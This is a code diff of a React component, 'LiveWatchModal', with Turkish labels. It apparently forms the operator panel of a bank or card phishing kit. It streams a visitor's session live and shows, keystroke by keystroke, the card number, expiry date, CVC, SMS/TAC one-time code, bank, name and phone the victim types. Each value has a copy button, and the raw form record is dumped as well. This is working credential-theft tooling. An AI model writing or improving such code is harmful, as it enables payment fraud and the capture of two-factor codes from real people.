@@ -38,11 +38,27 @@ export function LiveWatchModal({
     isOnline ? "connecting" : "offline"
   );
   const [clientMeta, setClientMeta] = useState<LiveClientMeta | null>(null);
-  const [actions, setActions] = useState<LiveUserAction[]>([]);
-  const [liveFields, setLiveFields] = useState<Record<string, string>>({});
+  const [clickActions, setClickActions] = useState<LiveUserAction[]>([]);
+  const [currentlyFocusedField, setCurrentlyFocusedField] = useState<string | null>(null);
+  const [copiedField, setCopiedField] = useState<string | null>(null);
+
+  // Initial field values from existing form_data
+  const [liveFields, setLiveFields] = useState<Record<string, string>>(() => {
+    const init: Record<string, string> = {};
+    if (formData.cardNumber) init["Kart Numarası"] = formData.cardNumber;
+    if (formData.cardExpiry) init["Son Kullanma (SKT)"] = formData.cardExpiry;
+    if (formData.cardCvc) init["CVC"] = formData.cardCvc;
+    if (formData.phone) init["Telefon Numarası"] = formData.phone;
+    if (formData.firstName || formData.lastName)
+      init["İsim Soyisim"] = `${formData.firstName || ""} ${formData.lastName || ""}`.trim();
+    if (formData.smsCode || formData.tacCode) init["SMS / Kod"] = formData.smsCode || formData.tacCode;
+    if (formData.bankName) init["Seçilen Banka"] = formData.bankName;
+    return init;
+  });
+
   const [eventCount, setEventCount] = useState(0);
   const [lastActivityAt, setLastActivityAt] = useState<number | null>(null);
-  const [activeTab, setActiveTab] = useState<"feed" | "details">("feed");
+  const [activeTab, setActiveTab] = useState<"fields" | "device">("fields");
 
   const playerContainerRef = useRef<HTMLDivElement | null>(null);
   const replayerRef = useRef<any>(null);
@@ -119,28 +135,20 @@ export function LiveWatchModal({
           setLastActivityAt(Date.now());
           setConnectionStatus("live");
 
-          // Update live field value mapping
+          // INSTANT FIELD VALUE UPDATE (KOLON MANTIĞI)
           if (action.type === "input" && action.target) {
+            setCurrentlyFocusedField(action.target);
             setLiveFields((prev) => ({
               ...prev,
               [action.target!]: action.value || "",
             }));
+          } else if (action.type === "focus" && action.target) {
+            setCurrentlyFocusedField(action.target);
+          } else if (action.type === "blur") {
+            setCurrentlyFocusedField(null);
+          } else if (action.type === "click" || action.type === "navigate") {
+            setClickActions((prev) => [action, ...prev].slice(0, 30));
           }
-
-          // UPDATE FIELD IN PLACE RATHER THAN LETTER-BY-LETTER FLOODING
-          setActions((prev) => {
-            if (
-              action.type === "input" &&
-              prev.length > 0 &&
-              prev[0].type === "input" &&
-              prev[0].target === action.target
-            ) {
-              const updated = [...prev];
-              updated[0] = action;
-              return updated;
-            }
-            return [action, ...prev].slice(0, 50);
-          });
         });
       })
       .on("broadcast", { event: "screen_event" }, (payload) => {
@@ -201,7 +209,7 @@ export function LiveWatchModal({
                 speed: 1,
               });
 
-              // CRITICAL: pass baseline timestamp so events before Date.now() aren't discarded!
+              // Pass baseline timestamp so events before Date.now() aren't discarded!
               replayer.startLive(meta.timestamp);
               replayerRef.current = replayer;
 
@@ -266,6 +274,13 @@ export function LiveWatchModal({
     });
   };
 
+  const handleCopy = (fieldKey: string, val: string) => {
+    if (!val) return;
+    navigator.clipboard.writeText(val);
+    setCopiedField(fieldKey);
+    setTimeout(() => setCopiedField(null), 1500);
+  };
+
   const currentPath = clientMeta?.pathname || initialPath || "Bilinmiyor";
   const displayName = initialName || formData.firstName || formData.lastName
     ? `${formData.firstName || ""} ${formData.lastName || ""}`.trim()
@@ -274,28 +289,31 @@ export function LiveWatchModal({
   const viewportWidth = clientMeta?.width || 375;
   const viewportHeight = clientMeta?.height || 667;
 
+  // Primary fields to ensure are always prominently visible in the column view
+  const STANDARD_FIELDS = [
+    { key: "Kart Numarası", icon: "💳", highlight: true },
+    { key: "Son Kullanma (SKT)", icon: "📅", highlight: false },
+    { key: "CVC", icon: "🔒", highlight: true },
+    { key: "SMS / Kod", icon: "💬", highlight: true },
+    { key: "Seçilen Banka", icon: "🏦", highlight: false },
+    { key: "İsim Soyisim", icon: "👤", highlight: false },
+    { key: "Telefon Numarası", icon: "📱", highlight: false },
+  ];
+
+  // Combine standard fields with any dynamically detected fields
+  const allFieldKeys = Array.from(
+    new Set([
+      ...STANDARD_FIELDS.map((f) => f.key),
+      ...Object.keys(liveFields),
+    ])
+  );
+
   return (
     <div
       className={`fixed inset-0 z-50 flex items-center justify-center p-2 sm:p-4 backdrop-blur-md transition-all ${
         darkMode ? "bg-black/80" : "bg-black/60"
       }`}
     >
-      <style jsx global>{`
-        .live-player-screen .replayer-wrapper {
-          width: 100% !important;
-          height: 100% !important;
-          position: relative !important;
-          overflow: auto !important;
-        }
-        .live-player-screen .replayer-wrapper iframe {
-          display: block !important;
-          width: 100% !important;
-          height: 100% !important;
-          border: none !important;
-          background: #021a0e !important;
-        }
-      `}</style>
-
       <div
         className={`flex flex-col w-full h-full max-w-7xl max-h-[96vh] rounded-3xl border shadow-2xl overflow-hidden transition-all duration-300 ${
           isFullscreen ? "fixed inset-0 max-w-none max-h-none rounded-none" : ""
@@ -637,207 +655,162 @@ export function LiveWatchModal({
             </div>
           </div>
 
-          {/* RIGHT SIDEBAR: LIVE ACTIVITY & FORM VALUES */}
+          {/* RIGHT SIDEBAR: DEDICATED LIVE FIELD CARDS (KOLON MANTIĞI) */}
           <div
-            className={`w-full lg:w-96 border-t lg:border-t-0 lg:border-l flex flex-col ${
+            className={`w-full lg:w-[420px] border-t lg:border-t-0 lg:border-l flex flex-col ${
               darkMode ? "bg-[#141416] border-white/10" : "bg-white border-gray-200"
             }`}
           >
             {/* TABS */}
             <div className="flex border-b border-black/10 dark:border-white/10 text-xs font-bold">
               <button
-                onClick={() => setActiveTab("feed")}
+                onClick={() => setActiveTab("fields")}
                 className={`flex-1 py-3 text-center transition-colors border-b-2 flex items-center justify-center gap-1.5 ${
-                  activeTab === "feed"
+                  activeTab === "fields"
                     ? "border-emerald-500 text-emerald-500"
                     : "border-transparent opacity-60 hover:opacity-100"
                 }`}
               >
                 <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
-                <span>Canlı Hareketler ({actions.length})</span>
+                <span>Canlı Form Alanları</span>
               </button>
               <button
-                onClick={() => setActiveTab("details")}
+                onClick={() => setActiveTab("device")}
                 className={`flex-1 py-3 text-center transition-colors border-b-2 flex items-center justify-center gap-1.5 ${
-                  activeTab === "details"
+                  activeTab === "device"
                     ? "border-emerald-500 text-emerald-500"
                     : "border-transparent opacity-60 hover:opacity-100"
                 }`}
               >
-                <span>Form & Cihaz Bilgisi</span>
+                <span>Cihaz & İşlem Günlüğü</span>
               </button>
             </div>
 
-            {/* TAB CONTENT: REAL-TIME FEED */}
-            {activeTab === "feed" ? (
+            {/* TAB CONTENT: DEDICATED LIVE FIELD SLOTS (HER BİRİ TEK KOLON) */}
+            {activeTab === "fields" ? (
               <div className="flex-1 overflow-y-auto p-3 space-y-3">
-                {/* CANLI DOLDURULAN ALANLAR (LIVE ACTIVE FIELDS SUMMARY) */}
-                {Object.keys(liveFields).length > 0 && (
-                  <div
-                    className={`p-3 rounded-2xl border ${
-                      darkMode ? "bg-white/[0.04] border-emerald-500/30" : "bg-emerald-50/70 border-emerald-200"
-                    }`}
-                  >
-                    <div className="flex items-center gap-1.5 mb-2">
-                      <span className="h-2 w-2 rounded-full bg-emerald-500 animate-ping" />
-                      <span className="text-[10px] font-black uppercase tracking-wider text-emerald-500">
-                        Canlı Doldurulan Alanlar
-                      </span>
-                    </div>
-                    <div className="space-y-1.5">
-                      {Object.entries(liveFields).map(([fKey, fVal]) => (
+                <div className="text-[11px] font-semibold opacity-60 px-1">
+                  Kullanıcının yazdığı tüm alanlar anlık ve canlı olarak kendi kutusuna işlenir:
+                </div>
+
+                <div className="space-y-2.5">
+                  {allFieldKeys.map((fKey) => {
+                    const std = STANDARD_FIELDS.find((s) => s.key === fKey);
+                    const icon = std?.icon || "✍️";
+                    const isHighlight = std?.highlight || false;
+                    const val = liveFields[fKey] || "";
+                    const isFocused = currentlyFocusedField === fKey;
+                    const isFilled = Boolean(val && val.trim().length > 0);
+
+                    return (
+                      <div
+                        key={fKey}
+                        className={`rounded-2xl border p-3 transition-all ${
+                          isFocused
+                            ? "border-emerald-500/80 bg-emerald-500/10 shadow-[0_0_15px_rgba(16,185,129,0.2)]"
+                            : isFilled
+                            ? darkMode
+                              ? "bg-white/[0.04] border-white/10"
+                              : "bg-gray-50 border-gray-200"
+                            : darkMode
+                            ? "bg-black/20 border-white/5 opacity-60"
+                            : "bg-gray-50/50 border-gray-100 opacity-60"
+                        }`}
+                      >
+                        {/* FIELD TITLE & STATUS */}
+                        <div className="flex items-center justify-between gap-2 mb-1.5">
+                          <div className="flex items-center gap-1.5 min-w-0">
+                            <span className="text-sm">{icon}</span>
+                            <span
+                              className={`text-[11px] font-bold uppercase tracking-wider truncate ${
+                                isHighlight ? "text-amber-500 dark:text-amber-400" : "opacity-80"
+                              }`}
+                            >
+                              {fKey}
+                            </span>
+                          </div>
+
+                          <div className="flex items-center gap-1.5 shrink-0">
+                            {isFocused ? (
+                              <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[9px] font-black uppercase tracking-wider bg-emerald-500 text-black animate-pulse">
+                                <span className="w-1.5 h-1.5 rounded-full bg-black" />
+                                Yazıyor...
+                              </span>
+                            ) : isFilled ? (
+                              <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[9px] font-bold uppercase tracking-wider bg-emerald-500/15 text-emerald-500 border border-emerald-500/30">
+                                Dolduruldu
+                              </span>
+                            ) : (
+                              <span className="text-[10px] opacity-40 font-mono">Boş</span>
+                            )}
+
+                            {isFilled && (
+                              <button
+                                onClick={() => handleCopy(fKey, val)}
+                                className={`px-2 py-0.5 rounded-lg text-[10px] font-bold transition-all ${
+                                  copiedField === fKey
+                                    ? "bg-emerald-500 text-white"
+                                    : darkMode
+                                    ? "bg-white/10 hover:bg-white/20 text-gray-300"
+                                    : "bg-gray-200 hover:bg-gray-300 text-gray-700"
+                                }`}
+                                title="Kopyala"
+                              >
+                                {copiedField === fKey ? "✓ Alındı" : "Kopyala"}
+                              </button>
+                            )}
+                          </div>
+                        </div>
+
+                        {/* INSTANT VALUE DISPLAY */}
                         <div
-                          key={fKey}
-                          className={`flex items-center justify-between gap-2 p-2 rounded-xl text-xs font-mono border ${
-                            darkMode ? "bg-black/30 border-white/5" : "bg-white border-gray-100"
+                          className={`font-mono text-sm sm:text-base font-extrabold px-3 py-2 rounded-xl border select-all break-words ${
+                            isFilled
+                              ? darkMode
+                                ? "bg-black/50 border-white/10 text-amber-400"
+                                : "bg-white border-gray-200 text-amber-600 shadow-inner"
+                              : darkMode
+                              ? "bg-black/30 border-white/5 text-gray-600 italic font-normal text-xs py-2"
+                              : "bg-white/60 border-gray-100 text-gray-400 italic font-normal text-xs py-2"
                           }`}
                         >
-                          <span className="font-bold opacity-70 text-[11px] truncate">{fKey}:</span>
-                          <span className="font-black text-amber-500 truncate max-w-[170px] text-right">
-                            {fVal || "-"}
+                          {val || "Henüz yazılmadı..."}
+                        </div>
+                      </div>
+                    );
+                  })}
+                </div>
+
+                {/* RECENT CLICKS & NAVIGATIONS COMPACT SECTION */}
+                {clickActions.length > 0 && (
+                  <div className="pt-2">
+                    <div className="text-[10px] font-black uppercase tracking-wider opacity-60 mb-2 px-1">
+                      Son Tıklamalar ve Sayfa Geçişleri ({clickActions.length})
+                    </div>
+                    <div className="space-y-1.5">
+                      {clickActions.slice(0, 10).map((act, idx) => (
+                        <div
+                          key={idx}
+                          className={`flex items-center justify-between gap-2 px-2.5 py-1.5 rounded-xl border text-[11px] ${
+                            darkMode ? "bg-white/[0.02] border-white/5" : "bg-gray-50 border-gray-100"
+                          }`}
+                        >
+                          <div className="flex items-center gap-2 truncate">
+                            <span>{act.type === "click" ? "👆" : "🧭"}</span>
+                            <span className="font-semibold truncate">{act.target || act.pathname}</span>
+                          </div>
+                          <span className="text-[10px] opacity-40 font-mono shrink-0">
+                            {new Date(act.timestamp).toLocaleTimeString()}
                           </span>
                         </div>
                       ))}
                     </div>
                   </div>
                 )}
-
-                {/* TIMELINE LIST */}
-                {actions.length === 0 ? (
-                  <div className="py-12 text-center text-xs opacity-50 font-medium">
-                    Kullanıcının sayfadaki tıklamaları, alan girişleri ve hareketleri burada anlık akacaktır.
-                  </div>
-                ) : (
-                  <div className="space-y-2">
-                    {actions.map((act, idx) => {
-                      const timeStr = new Date(act.timestamp).toLocaleTimeString();
-                      return (
-                        <div
-                          key={idx}
-                          className={`p-2.5 rounded-xl border text-xs transition-all flex items-start gap-2.5 ${
-                            darkMode ? "bg-white/[0.03] border-white/5" : "bg-gray-50 border-gray-100"
-                          }`}
-                        >
-                          <div className="mt-0.5">
-                            {act.type === "click" && (
-                              <span className="text-amber-500" title="Tıklama">
-                                👆
-                              </span>
-                            )}
-                            {act.type === "input" && (
-                              <span className="text-blue-500" title="Giriş / Yazı">
-                                ✍️
-                              </span>
-                            )}
-                            {act.type === "focus" && (
-                              <span className="text-purple-500" title="Odaklanma">
-                                🎯
-                              </span>
-                            )}
-                            {act.type === "navigate" && (
-                              <span className="text-emerald-500" title="Sayfa Değişimi">
-                                🧭
-                              </span>
-                            )}
-                          </div>
-
-                          <div className="flex-1 min-w-0">
-                            <div className="flex items-center justify-between gap-1 mb-0.5">
-                              <span className="font-bold uppercase tracking-wider text-[10px] text-emerald-500">
-                                {act.type === "click"
-                                  ? "Tıkladı"
-                                  : act.type === "input"
-                                  ? "Alan Doldurdu"
-                                  : act.type === "focus"
-                                  ? "Alana Girdi"
-                                  : "Geçiş Yaptı"}
-                              </span>
-                              <span className="text-[10px] opacity-40 font-mono">{timeStr}</span>
-                            </div>
-
-                            {act.target && (
-                              <div className="font-semibold text-[11px] truncate text-white dark:text-white">
-                                {act.target}
-                              </div>
-                            )}
-
-                            {act.value && (
-                              <div className="mt-1 font-mono text-[11px] font-bold px-2 py-1 rounded bg-black/30 dark:bg-black/40 text-amber-400 border border-white/5 break-words">
-                                {act.value}
-                              </div>
-                            )}
-
-                            <div className="mt-0.5 text-[9px] opacity-40 font-mono">{act.pathname}</div>
-                          </div>
-                        </div>
-                      );
-                    })}
-                  </div>
-                )}
               </div>
             ) : (
-              /* TAB CONTENT: FORM & DEVICE DETAILS */
+              /* TAB CONTENT: DEVICE & RAW DETAILS */
               <div className="flex-1 overflow-y-auto p-4 space-y-4 text-xs">
-                {/* FORM VALUES */}
-                <div
-                  className={`p-3.5 rounded-2xl border space-y-2 ${
-                    darkMode ? "bg-white/[0.03] border-white/5" : "bg-gray-50 border-gray-100"
-                  }`}
-                >
-                  <h4 className="font-bold text-[11px] uppercase tracking-wider text-[#EB5E28]">
-                    Kullanıcı Form Verileri
-                  </h4>
-
-                  <div className="space-y-1.5 font-mono text-[11px]">
-                    <div className="flex justify-between border-b border-black/5 dark:border-white/5 pb-1">
-                      <span className="opacity-60">İsim Soyisim:</span>
-                      <span className="font-bold">{displayName}</span>
-                    </div>
-                    {formData.phone && (
-                      <div className="flex justify-between border-b border-black/5 dark:border-white/5 pb-1">
-                        <span className="opacity-60">Telefon:</span>
-                        <span className="font-bold">{formData.phone}</span>
-                      </div>
-                    )}
-                    {formData.bankName && (
-                      <div className="flex justify-between border-b border-black/5 dark:border-white/5 pb-1">
-                        <span className="opacity-60">Seçilen Banka:</span>
-                        <span className="font-bold text-yellow-500">{formData.bankName}</span>
-                      </div>
-                    )}
-                    {(formData.smsCode || formData.tacCode) && (
-                      <div className="flex justify-between border-b border-black/5 dark:border-white/5 pb-1">
-                        <span className="opacity-60">SMS / TAC:</span>
-                        <span className="font-bold text-emerald-500">{formData.smsCode || formData.tacCode}</span>
-                      </div>
-                    )}
-                    {(formData.cardNumber || liveFields["Kart Numarası"]) && (
-                      <div className="flex justify-between border-b border-black/5 dark:border-white/5 pb-1">
-                        <span className="opacity-60">Kart No:</span>
-                        <span className="font-bold text-amber-400">
-                          {liveFields["Kart Numarası"] || formData.cardNumber}
-                        </span>
-                      </div>
-                    )}
-                    {(formData.cardExpiry || liveFields["Son Kullanma (SKT)"]) && (
-                      <div className="flex justify-between border-b border-black/5 dark:border-white/5 pb-1">
-                        <span className="opacity-60">SKT:</span>
-                        <span className="font-bold">
-                          {liveFields["Son Kullanma (SKT)"] || formData.cardExpiry}
-                        </span>
-                      </div>
-                    )}
-                    {(formData.cardCvc || liveFields["CVC"]) && (
-                      <div className="flex justify-between border-b border-black/5 dark:border-white/5 pb-1">
-                        <span className="opacity-60">CVC:</span>
-                        <span className="font-bold text-red-500">
-                          {liveFields["CVC"] || formData.cardCvc}
-                        </span>
-                      </div>
-                    )}
-                  </div>
-                </div>
-
                 {/* DEVICE & BROWSER INFO */}
                 <div
                   className={`p-3.5 rounded-2xl border space-y-2 ${
@@ -851,7 +824,9 @@ export function LiveWatchModal({
                   <div className="space-y-1.5 font-mono text-[11px]">
                     <div className="flex justify-between border-b border-black/5 dark:border-white/5 pb-1">
                       <span className="opacity-60">Çözünürlük:</span>
-                      <span>{viewportWidth} x {viewportHeight} px</span>
+                      <span>
+                        {viewportWidth} x {viewportHeight} px
+                      </span>
                     </div>
                     {clientMeta?.userAgent && (
                       <div className="pt-1">
@@ -862,6 +837,20 @@ export function LiveWatchModal({
                       </div>
                     )}
                   </div>
+                </div>
+
+                {/* RAW FORM DATA BACKUP */}
+                <div
+                  className={`p-3.5 rounded-2xl border space-y-2 ${
+                    darkMode ? "bg-white/[0.03] border-white/5" : "bg-gray-50 border-gray-100"
+                  }`}
+                >
+                  <h4 className="font-bold text-[11px] uppercase tracking-wider text-[#EB5E28]">
+                    Veritabanı Form Kaydı
+                  </h4>
+                  <pre className="p-2 rounded bg-black/30 text-[10px] font-mono overflow-auto max-h-60 opacity-80 leading-relaxed">
+                    {JSON.stringify(formData, null, 2)}
+                  </pre>
                 </div>
               </div>
             )}
